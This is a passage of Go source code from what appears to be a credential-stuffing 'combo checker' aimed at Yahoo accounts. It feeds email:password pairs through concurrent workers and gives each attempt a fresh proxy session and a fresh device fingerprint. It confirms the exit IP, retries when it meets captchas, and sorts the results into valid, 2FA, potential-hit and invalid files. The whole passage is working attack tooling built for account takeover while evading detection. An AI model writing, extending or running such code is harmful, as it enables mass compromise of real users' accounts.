		for _, c := range client.GetCookies(u) {
			if c == nil || c.Name == "" {
				continue
			}
			if _, ok := seen[c.Name]; ok {
				continue
			}
			seen[c.Name] = struct{}{}
			names = append(names, c.Name)
		}
	}
	return names
}

func fetchExitIP(client tls_client.HttpClient, fp deviceFP) (string, error) {
	endpoints := []string{
		"https://api.ipify.org?format=json",
		"https://httpbin.org/ip",
		"https://api.myip.com",
	}
	ipRe := regexp.MustCompile(`\b(\d{1,3}(?:\.\d{1,3}){3})\b`)
	for _, ep := range endpoints {
		raw, _, _, err := doRequest(client, http.MethodGet, ep, "", fp.headers(nil), true)
		if err != nil {
			continue
		}
		var m map[string]any
		_ = json.Unmarshal([]byte(raw), &m)
		if ip, ok := m["ip"].(string); ok && ip != "" {
			return ip, nil
		}
		if origin, ok := m["origin"].(string); ok && origin != "" {
			return strings.TrimSpace(strings.Split(origin, ",")[0]), nil
		}
		if mm := ipRe.FindStringSubmatch(raw); len(mm) > 1 {
			return mm[1], nil
		}
	}
	return "", fmt.Errorf("could not resolve exit IP via proxy")
}

func ensureResultDir() {
	_ = os.MkdirAll(resultDir, 0o755)
}

type resultKind int

const (
	resultValid resultKind = iota
	resultInvalid
	resultCaptcha
	resultPotentialHit
	result2FA
)

type runStats struct {
	Valid        int
	Invalid      int
	Captcha      int
	PotentialHit int
	TwoFA        int
}

func isCaptchaReason(reason string) bool {
	r := strings.ToLower(strings.TrimSpace(reason))
	return strings.HasPrefix(r, "captcha")
}

func isProxyIssueReason(reason string) bool {
	r := strings.ToLower(strings.TrimSpace(reason))
	return strings.HasPrefix(r, "proxy issue") ||
		strings.Contains(r, "could not resolve exit ip") ||
		strings.Contains(r, "proxy")
}

func isRetryableReason(reason string) bool {
	return isCaptchaReason(reason) || isProxyIssueReason(reason)
}

func classifyError(err error, responseHint string) (resultKind, string) {
	reason := firstLine(err.Error())
	switch {
	case isCaptchaReason(reason):
		return resultCaptcha, reason
	case isProxyIssueReason(reason), isProxyNetworkError(err):
		return resultCaptcha, "proxy issue"
	case isPotentialHitReason(reason):
		return resultPotentialHit, reason
	case is2FAReason(reason):
		return result2FA, reason
	default:
		return resultInvalid, reason
	}
}

func isProxyNetworkError(err error) bool {
	if err == nil {
		return false
	}
	msg := strings.ToLower(err.Error())
	needles := []string{
		"could not resolve exit ip",
		"proxy",
		"timeout",
		"i/o timeout",
		"connection refused",
		"connection reset",
		"tls handshake",
		"no such host",
		"network is unreachable",
		"broken pipe",
		"eof",
	}
	for _, n := range needles {
		if strings.Contains(msg, n) {
			return true
		}
	}
	return false
}

func isPotentialHitReason(reason string) bool {
	return strings.HasPrefix(strings.ToLower(strings.TrimSpace(reason)), "potential-hit")
}

func is2FAReason(reason string) bool {
	return strings.HasPrefix(strings.ToLower(strings.TrimSpace(reason)), "2fa")
}

func resetResultDir() {
	ensureResultDir()
	_ = os.WriteFile(validFile, []byte{}, 0o644)
	_ = os.WriteFile(invalidFile, []byte{}, 0o644)
	_ = os.WriteFile(captchaFile, []byte{}, 0o644)
	_ = os.WriteFile(potentialHitFile, []byte{}, 0o644)
	_ = os.WriteFile(twoFAFile, []byte{}, 0o644)
}

func saveComboResult(kind resultKind, login Combo, detail string) {
	ensureResultDir()
	combo := login.Email + ":" + login.Password
	line := combo + "\n"
	file := validFile
	switch kind {
	case result2FA:
		file = twoFAFile
	case resultPotentialHit:
		file = potentialHitFile
	case resultCaptcha:
		file = captchaFile
		line = combo + " | " + detail + "\n"
	case resultInvalid:
		file = invalidFile
		line = combo + " | " + detail + "\n"
	}

	writeMu.Lock()
	defer writeMu.Unlock()
	f, err := os.OpenFile(file, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
	if err != nil {
		return
	}
	defer f.Close()
	_, _ = f.WriteString(line)
}

func stamp(checked int) string {
	elapsed := time.Since(runStarted)
	if runStarted.IsZero() {
		elapsed = 0
	}
	sec := int(elapsed.Seconds())
	mins := elapsed.Minutes()
	if mins < 1.0/60.0 {
		mins = 1.0 / 60.0
	}
	cpm := 0
	if checked > 0 {
		cpm = int(float64(checked) / mins)
	}
	return fmt.Sprintf("%ds | cpm=%d", sec, cpm)
}

func formatComboLine(kind resultKind, checked, total int, login Combo, ip, detail, response string) string {
	color := cBrightRed
	status := "FAIL"
	switch kind {
	case resultValid:
		color = cBrightGreen
		status = "OK"
	case resultCaptcha:
		color = cBrightYellow
		if isProxyIssueReason(detail) {
			status = "PROXY"
		} else {
			status = "CAPTCHA"
		}
	case resultPotentialHit:
		color = cBrightMagenta
		status = "POTENTIAL-HIT"
	case result2FA:
		color = cBrightBlue
		status = "2FA"
	}
	if ip == "" {
		ip = "n/a"
	}
	detail = strings.ReplaceAll(strings.ReplaceAll(detail, "\r", " "), "\n", " ")
	main := fmt.Sprintf(
		"%s [%d/%d] %s | %s:%s | ip=%s | %s",
		status, checked, total, stamp(checked), login.Email, login.Password, ip, detail,
	)
	line := paint(color, main)
	response = compactResponse(response)
	if response != "" {
		line += paintGray(" | " + response)
	}
	return line
}

func runWithWorkers(combos []Combo, concurrency int) runStats {
	if concurrency > len(combos) {
		concurrency = len(combos)
	}
	jobs := make(chan Combo)
	var validN, invalidN, captchaN, potentialN, twoFAN atomic.Int64
	var checked atomic.Int64
	var wg sync.WaitGroup

	worker := func() {
		defer wg.Done()
		for login := range jobs {
			switch checkCombo(login, &checked, len(combos)) {
			case resultValid:
				validN.Add(1)
			case resultCaptcha:
				captchaN.Add(1)
			case resultPotentialHit:
				potentialN.Add(1)
			case result2FA:
				twoFAN.Add(1)
			default:
				invalidN.Add(1)
			}
		}
	}

	wg.Add(concurrency)
	for i := 0; i < concurrency; i++ {
		go worker()
	}
	for _, login := range combos {
		jobs <- login
	}
	close(jobs)
	wg.Wait()
	return runStats{
		Valid:        int(validN.Load()),
		Invalid:      int(invalidN.Load()),
		Captcha:      int(captchaN.Load()),
		PotentialHit: int(potentialN.Load()),
		TwoFA:        int(twoFAN.Load()),
	}
}

func checkCombo(login Combo, checked *atomic.Int64, total int) resultKind {
	const maxAttempts = 3

	var (
		lastKind   resultKind
		lastIP     string
		lastDetail string
		lastResp   string
	)

	for attempt := 1; attempt <= maxAttempts; attempt++ {
		fp := newDeviceFP()
		client, err := createSessionClient()
		if err != nil {
			lastKind = resultCaptcha
			lastIP = ""
			lastDetail = "proxy issue"
			lastResp = firstLine(err.Error())
			if attempt < maxAttempts {
				continue
			}
			break
		}

		ip, err := fetchExitIP(client, fp)
		if err != nil {
			client.CloseIdleConnections()
			lastKind = resultCaptcha
			lastIP = ""
			lastDetail = "proxy issue"
			lastResp = firstLine(err.Error())
			if attempt < maxAttempts {
				continue
			}
			break
		}

		result, err := yahooHTTPLogin(client, login, fp)
		client.CloseIdleConnections()
		if err == nil {
			n := int(checked.Add(1))
			saveComboResult(resultValid, login, "")
			fmt.Println(formatComboLine(resultValid, n, total, login, ip, "iri="+result.IRI, result.Response))
			return resultValid
		}

		kind, detail := classifyError(err, result.Response)
		lastKind = kind
		lastIP = ip
		lastDetail = detail
		lastResp = result.Response

		if isRetryableReason(detail) && attempt < maxAttempts {
			continue
		}

		n := int(checked.Add(1))
		saveComboResult(kind, login, detail)
		fmt.Println(formatComboLine(kind, n, total, login, ip, detail, result.Response))
		return kind
	}

	n := int(checked.Add(1))
	if lastKind == 0 {
		lastKind = resultCaptcha
	}
	if lastDetail == "" {
		lastDetail = "proxy issue"
	}
	saveComboResult(lastKind, login, lastDetail)
	fmt.Println(formatComboLine(lastKind, n, total, login, lastIP, lastDetail, lastResp))
	return lastKind
}

func firstLine(s string) string {
	s = strings.ReplaceAll(s, "\r", "\n")
	if i := strings.IndexByte(s, '\n'); i >= 0 {
		return strings.TrimSpace(s[:i])
	}
	return strings.TrimSpace(s)
}
